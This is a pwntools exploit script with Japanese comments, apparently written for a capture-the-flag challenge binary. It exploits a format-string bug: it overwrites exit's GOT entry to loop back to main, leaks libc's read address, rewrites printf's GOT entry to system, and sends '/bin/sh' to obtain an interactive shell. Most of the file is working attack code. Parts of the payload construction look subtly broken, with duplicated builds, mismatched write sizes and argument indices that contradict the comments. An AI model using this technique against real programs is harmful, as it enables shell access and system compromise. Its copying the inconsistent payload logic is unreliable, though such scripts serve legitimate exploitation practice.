#!/usr/bin/env python3

# $ ptyhon3 exploit_vulnfunc_2.py

from pwn import *

bin_file = './chall_vulnfunc'
context(os = 'linux', arch = 'amd64')
#context.log_level = 'debug'

context.binary = bin_file
elf = context.binary

binf = ELF(bin_file)
addr_main           = binf.functions['main'].address    # main()のアドレス
addr_got_exit       = binf.got['exit']                  # GOTテーブル:exit()のアドレス
addr_got_printf     = binf.got['printf']                # GOTテーブル:printf()のアドレス
addr_got_read       = binf.got['read']                  # GOTテーブル:read()のアドレス

info('addr_main = 0x{:08x}'.format(addr_main))
info('addr_got_exit = 0x{:08x}'.format(addr_got_exit))
info('addr_got_printf = 0x{:08x}'.format(addr_got_printf))
info('addr_got_read = 0x{:08x}'.format(addr_got_read))

libc = binf.libc
offset_libc_read    = libc.functions['read'].address    # libcのread()のアドレス
offset_libc_system  = libc.functions['system'].address  # libcのsystem()のアドレス

info('offset_libc_read = 0x{:08x}'.format(offset_libc_read))
info('offset_libc_system = 0x{:08x}'.format(offset_libc_system))

# ユーザの入力の位置確認
def check_format_string_pos(conn, **kwargs):
    exploit = 'aaaaaaaa %p %p %p %p %p %p %p %p %p'     # 書式文字列aaaaaaaaが何番目に表示されるか調べる
    conn.sendline(exploit)
    print(conn.recvall().decode())                      # 0x6161616161616161が7番目に表示される

# 設定した値の確認
def set_got_addr(conn, **kwargs):
    exploit = b'%7$p'.ljust(8, b'\x00')                 # 7番目の書式文字列 (スタックに積むため8byte単位にアライメント)
    exploit += struct.pack('<Q', addr_got_read)         # readのGOTエントリ (スタックに積むため8byte単位にアライメント)
    conn.sendafter('message\n', exploit)                # chall_vulnfuncのbufに書き込む
    print(conn.recvall().decode())                      # printf('%7$p',readのGOTエントリ)となり、readのGOTエントリ(0x404030)が表示される

# GOTの読み出し（%sをつけて読み出す）
def read_got_addr(conn, **kwargs):
    exploit = b'%7$s'.ljust(8, b'\x00')                 # 7番目の書式文字列 (スタックに積むため8byte単位にアライメント)
    exploit += struct.pack('<Q', addr_got_read)         # readのGOTエントリ (スタックに積むため8byte単位にアライメント)
    conn.sendafter('message\n', exploit)                # chall_vulnfuncのbufに書き込む
    print(conn.recvall().hex())                         # printf('%7$s',readのGOTエントリ)となり、readのアドレスをリークできる

def attack(conn, **kwargs):

    # exit() が呼ばれたときに main() に戻るようにする
    # これにより「何度もフォーマットストリング脆弱性を利用できる」＝ループ化
    overwrite = {addr_got_exit : addr_main}             # exit()のGOTをmain()に書き換えるための辞書
    info('overwrite = {}'.format(overwrite))
    exploit = fmtstr_payload(6, overwrite, numbwritten = 0, write_size = 'short')    # 書式文字列攻撃用のペイロード作成
    info('exploit = {}'.format(exploit))
    #conn.sendafter('message\n', exploit)

    # アドレス取得
    main_addr = addr_main
    exit_got = elf.got['exit']

    log.info(f"main: {hex(main_addr)}")
    log.info(f"exit@GOT: {hex(exit_got)}")

    # フォーマットストリングオフセットを特定（例: 6）
    offset = 6  # 実際には cyclic や %p などで確認推奨

    # GOT書き換えペイロード生成
    payload = fmtstr_payload(offset, {exit_got: main_addr}, numbwritten = 0, write_size = 'short')
    info('payload = {}'.format(payload))


    main = addr_main
    exit_got = elf.got['exit']

    log.info(f"main: {hex(main)}")
    log.info(f"exit@got: {hex(exit_got)}")

    # 2バイトずつ書くために分割
    main_low = main & 0xffff
    main_high = (main >> 16) & 0xffff

    # 書き込み先をフォーマット文字列の後ろに付ける（リトルエンディアン）
    payload = b""
    payload += f"%{main_low}c%9$lln".encode()   # 最初に下位2バイト
    payload += f"%{(main_high - main_low) % 0x100}c%10$hhn".encode()  # 次に上位2バイト

    # 6番目、7番目の引数にアドレスが来るように配置
    #payload = payload.ljust(40, b"A")  # パディング
    payload += p64(exit_got)
    payload += p64(exit_got + 2)

    # プログラムに入力を送信
    info('payload = {}'.format(payload))
    conn.sendafter('message\n', payload)

    # readのアドレスをリークする
    conn.sendlineafter('message\n', '%3$p')
    addr_libc_read = int(conn.recvline(keepends=False), 16) - 0x12
    info('addr_libc_read = 0x{:08x}'.format(addr_libc_read))
    libc.address = addr_libc_read - offset_libc_read
    info('addr_libc_base = 0x{:08x}'.format(libc.address))
    addr_libc_system    = libc.functions['system'].address

    #exploit = b'%7$s'.ljust(8, b'\x00')                 # 7番目の書式文字列 (スタックに積むため8byte単位にアライメント)
    #exploit += struct.pack('<Q', addr_got_read)         # readのGOTエントリ (スタックに積むため8byte単位にアライメント)
    #conn.sendafter('message\n', exploit)                # chall_vulnfuncのbufに書き込む
    #print(conn.recvline(keepends=False).hex())          # printf('%7$s',readのGOTエントリ)となり、readのアドレスをリークできる

    # printf()のGOTをsystem()に書き換え
    exploit  = '%{}c'.format((addr_libc_system >> 16) & 0xff)
    exploit += '%10$hhn'
    exploit += '%{}c'.format((addr_libc_system & 0xffff) - ((addr_libc_system >> 16) & 0xff))
    exploit += '%11$hn'
    exploit  = exploit.ljust(0x20, 'x').encode()
    exploit += flat(addr_got_printf+2, addr_got_printf) # 10, 11
    conn.sendafter('message\n', exploit)
    conn.sendafter('message\n', '/bin/sh')

def main():
    conn = process(bin_file)
    check_format_string_pos(conn)

    conn = process(bin_file)
    set_got_addr(conn)

    conn = process(bin_file)
    read_got_addr(conn)

    # conn = gdb.debug(bin_file)
    conn = process(bin_file)
    attack(conn)
    conn.interactive()

if __name__=='__main__':
    main()
